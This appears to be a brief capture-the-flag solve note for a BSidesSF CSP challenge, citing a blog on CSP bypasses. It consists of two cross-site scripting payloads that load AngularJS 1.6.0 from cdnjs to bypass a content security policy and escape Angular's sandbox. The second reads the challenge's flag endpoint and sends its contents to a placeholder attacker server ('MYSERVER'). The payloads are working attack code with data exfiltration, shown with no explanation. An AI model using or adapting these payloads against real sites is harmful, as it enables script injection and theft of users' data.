
https://brutelogic.com.br/blog/csp-bypass-guidelines/

```
<Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js>
</Script><K Ng-App>{{$new.constructor('alert(1)')()}}
```
```
 <Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js>
</Script><K Ng-App>{{$new.constructor("fetch('https://csp-2-f692634b.challenges.bsidessf.net/csp-two-flag').then(r => {return r.text();}).then(d => {fetch('https://MYSERVER?q=' + d)})")()}}
```
